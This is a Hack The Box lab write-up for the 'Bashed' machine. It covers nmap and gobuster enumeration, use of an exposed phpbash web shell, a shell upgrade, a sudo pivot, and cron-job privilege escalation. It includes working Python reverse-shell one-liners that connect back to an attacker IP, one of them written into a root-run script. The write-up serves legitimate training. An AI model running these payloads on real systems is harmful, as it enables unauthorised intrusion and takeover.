![logo](/logo.png)

# [Bashed- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 09 Dec 2017 as the fifth machine on HTB,Bashed created by [Arrexel](https://app.hackthebox.com/users/2904) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *phpbash
  *cronjob
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/bashed 10.10.10.68
```

###### Output 

![](/Linux/Linux-Easy/Bashed/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/bashed 10.10.10.68                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 20:09 EAT
Nmap scan report for 10.10.10.68
Host is up (0.33s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 318.36 seconds
```

looking at the results  we find out that there are 1 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.18`. 

port[80]- http


when we naviagate to [https://10.10.10.68](https://10.10.10.68)  we find a page which talks about phpbash


![](/Linux/Linux-Easy/Bashed/Screenshots/browser.png)

 find nothing od interesting so lets start gobuster so that I can be able to enumerate active directories folders. 

```sh
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt -k --no-error
```

![](/Linux/Linux-Easy/Bashed/Screenshots/gobuster.png)


it revels directories and looking at `dev` i find something interesting 

![](/Linux/Linux-Easy/Bashed/Screenshots/dev.png)

Clicking on phpbash gives a shell:

![](/Linux/Linux-Easy/Bashed/Screenshots/shell.png)

Inside `/home/arrexel` is the user flag:

![](/Linux/Linux-Easy/Bashed/Screenshots/userflag.png)

lest upgrade the shell so tha we can have a more interactive shell and using our local machine. we then run this to the webshell of the target.

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![](/Linux/Linux-Easy/Bashed/Screenshots/shell2.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

![](/Linux/Linux-Easy/Bashed/Screenshots/stty.png)

lets run LinEnum to get info about possible privsec.

![](/Linux/Linux-Easy/Bashed/Screenshots/linenum.png)

The command `sudo -l` reveals that the `www-data` user can run any command as
`scriptmanager`. Running the command

![](/Linux/Linux-Easy/Bashed/Screenshots/sudol.png)

 Running the command will spawn a bash shell and give full read/write access to `/scripts`

```sh
sudo -u scriptmanager bash -i
```

![](/Linux/Linux-Easy/Bashed/Screenshots/bashi.png)

Looking at the information of the files in the directory shows that `test.py` appears to be executed
every minute. This can be inferred by reading `test.py` and looking at the timestamp of `test.txt`.
The text file is owned by root, so it can also be assumed that it is run as a root cron job. A root
shell can be obtained simply by modifying `test.py` or creating a new Python file in the `/scripts`
directory, as all scripts in the directory are executed.

lests creat a python exploit an execute it from the directory by editing `test.py`

```sh
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.15\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > test.py
```

and after a second we get root shell and we can get the `root flag` at 

![](/Linux/Linux-Easy/Bashed/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------




